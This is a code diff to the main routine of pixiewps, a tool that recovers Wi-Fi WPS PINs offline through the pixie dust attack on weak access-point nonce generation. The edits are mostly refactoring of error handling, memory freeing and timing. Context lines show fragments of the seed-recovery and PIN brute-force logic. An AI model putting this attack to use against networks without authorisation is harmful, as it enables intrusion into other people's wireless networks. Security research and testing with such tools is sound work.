@@ -1,5 +1,5 @@
 /*
- * pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
+ * Pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
  *           All credits for the research go to Dominique Bongard.
  *
  * Special thanks to: datahead, soxrok2212
@@ -75,25 +75,10 @@ int main(int argc, char **argv) {
 
 	struct global *wps;
 	if ((wps = calloc(1, sizeof(struct global)))) {
-		wps->pke     = 0;
-		wps->pkr     = 0;
-		wps->e_hash1 = 0;
-		wps->e_hash2 = 0;
-		wps->authkey = 0;
-		wps->e_nonce = 0;
-		wps->r_nonce = 0;
-		wps->e_bssid = 0;
-		wps->psk1    = 0;
-		wps->psk2    = 0;
-		wps->dhkey   = 0;
-		wps->kdk     = 0;
-		wps->wrapkey = 0;
-		wps->emsk    = 0;
-		wps->e_s1    = 0;
-		wps->e_s2    = 0;
-		wps->bruteforce = false;
-		wps->verbosity = 2;
-		wps->error = calloc(256, 1); if (!wps->error) goto memory_err;
+		wps->verbosity = 3;
+		wps->error = calloc(256, 1);
+		if (!wps->error)
+			goto memory_err;
 		wps->error[0] = '\n';
 	} else {
 		memory_err:
@@ -193,32 +178,42 @@ int main(int argc, char **argv) {
 				break;
 			case 'h':
 				goto usage_err;
+				break;
 			case '?':
 			default:
-				fprintf(stderr, "%s -h for help\n", argv[0]);
+				fprintf(stderr, "Run %s -h for help.\n", argv[0]);
+				free(wps->error);
+				free(wps);
 				return ARG_ERROR;
 		}
 		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
 	}
 
-	/* Not all required arguments have been supplied */
-	if (wps->pke == 0 || wps->e_hash1 == 0 || wps->e_hash2 == 0) {
-		wps->error = "\n [!] Not all required arguments have been supplied!\n\n";
+	if (argc - optind != 0) {
+		snprintf(wps->error, 256, "\n [!] Unknown argument(s)!\n\n");
 
 		usage_err:
 			fprintf(stderr, usage, VERSION, argv[0], wps->error);
+			free(wps->error);
+			free(wps);
 			return ARG_ERROR;
+	}
+
+	/* Not all required arguments have been supplied */
+	if (wps->pke == 0 || wps->e_hash1 == 0 || wps->e_hash2 == 0) {
+		snprintf(wps->error, 256, "\n [!] Not all required arguments have been supplied!\n\n");
+		goto usage_err;
 	}
 
 	/* If --dh-small is selected then no --pkr should be supplied */
 	if (wps->pkr && wps->small_dh_keys) {
-		wps->error = "\n [!] Options --dh-small and --pkr are mutually exclusive!\n\n";
+		snprintf(wps->error, 256, "\n [!] Options --dh-small and --pkr are mutually exclusive!\n\n");
 		goto usage_err;
 	}
 
 	/* Either --pkr or --dh-small must be specified */
 	if (!wps->pkr && !wps->small_dh_keys) {
-		wps->error = "\n [!] Either --pkr or --dh-small must be specified!\n\n";
+		snprintf(wps->error, 256, "\n [!] Either --pkr or --dh-small must be specified!\n\n");
 		goto usage_err;
 	}
 
@@ -286,15 +281,15 @@ int main(int argc, char **argv) {
 						}
 						free(buffer);
 					} else {
-						wps->error = "\n [!] Neither --authkey and --e-bssid have been supplied!\n\n";
+						snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-bssid have been supplied!\n\n");
 						goto usage_err;
 					}
 				} else {
-					wps->error = "\n [!] Neither --authkey and --r-nonce have been supplied!\n\n";
+					snprintf(wps->error, 256, "\n [!] Neither --authkey and --r-nonce have been supplied!\n\n");
 					goto usage_err;
 				}
 			} else {
-				wps->error = "\n [!] Neither --authkey and --e-nonce have been supplied!\n\n";
+				snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-nonce have been supplied!\n\n");
 				goto usage_err;
 			}
 		}
@@ -323,15 +318,14 @@ int main(int argc, char **argv) {
 	bool valid = false;
 
 	int mode = 1; bool found = false;
-	struct timeval t0, t1;
-
-	gettimeofday(&t0, 0);
+	clock_t c_start, c_end;
+	c_start = clock();
 
 	while (mode <= MAX_MODE && !found) {
 
 		seed = 0; print_seed = 0;
 
-		/* ES-1 = ES-2 = E-Nonce */
+		/* E-S1 = E-S2 = E-Nonce */
 		if (mode == 2 && wps->e_nonce) {
 			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
 			memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN);
@@ -355,11 +349,11 @@ int main(int argc, char **argv) {
 				if (i == WPS_NONCE_LEN) { /* Seed found */
 					print_seed = seed;
 
-					/* Advance to get ES-1 */
+					/* Advance to get E-S1 */
 					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
 						wps->e_s1[i] = (unsigned char) rand_r(&seed);
 
-					/* Advance to get ES-2 */
+					/* Advance to get E-S2 */
 					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
 						wps->e_s2[i] = (unsigned char) rand_r(&seed);
 
@@ -407,6 +401,7 @@ int main(int argc, char **argv) {
 
 				struct random_data *buf = (struct random_data *) calloc(1, sizeof(struct random_data));
 				char *rand_statebuf = (char *) calloc(1, 128);
+
 				initstate_r(seed, rand_statebuf, 128, buf);
 				int32_t res = 0;
 
@@ -416,7 +411,7 @@ int main(int argc, char **argv) {
 					int i;
 					for (i = 0; i < 4; i++) {
 						random_r(buf, &res);
-						if (res != randr_enonce[i]) break;
+						if ((uint32_t) res != randr_enonce[i]) break;
 					}
 
 					if (i == 4) {
@@ -426,7 +421,7 @@ int main(int argc, char **argv) {
 							random_r(buf, &res);
 							uint32_t be = __be32_to_cpu(res);
 							memcpy(&(wps->e_s1[4 * i]), &be, 4);
-							memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* ES-1 = ES-2 != E-Nonce */
+							memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
 						}
 					}
 
@@ -443,7 +438,8 @@ int main(int argc, char **argv) {
 
 		/* WPS pin cracking */
 		if (mode == 1 || (mode == 2 && wps->e_nonce) || (mode == 3 && print_seed) || (mode == 4 && print_seed)) {
-crack:
+
+		crack:
 			first_half = 0; second_half = 0;
 
 			while (first_half < 10000) {
@@ -528,9 +524,11 @@ crack:
 		mode++;
 	}
 
-	gettimeofday(&t1, 0);
-	long elapsed_s = t1.tv_sec - t0.tv_sec;
+	c_end = clock();
+	long ms_elapsed = (c_end - c_start) / 1000;
+
 	mode--;
+	if (mode == MAX_MODE + 1) mode--;
 
 	printf("\n Pixiewps %s\n", VERSION);
 
@@ -569,10 +567,10 @@ crack:
 	} else {
 		printf("\n [-] WPS pin not found!");
 	}
-	printf("\n\n [*] Time taken: %lu s\n\n", elapsed_s);
+	printf("\n\n [*] Time taken: %ld s %ld ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);
 
 	if (!found && mode == 4 && valid && !wps->bruteforce) {
-		printf(" [!] The AP /might be/ vulnerable to mode 4. Try again with --force or with another (newer) set of data.\n\n");
+		printf(" [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.\n\n");
 	}
 
 	free(result);
@@ -619,4 +617,3 @@ int32_t rand_r(uint32_t *seed) {
 	*seed = s;
 	return (int32_t) uret;
 }
-
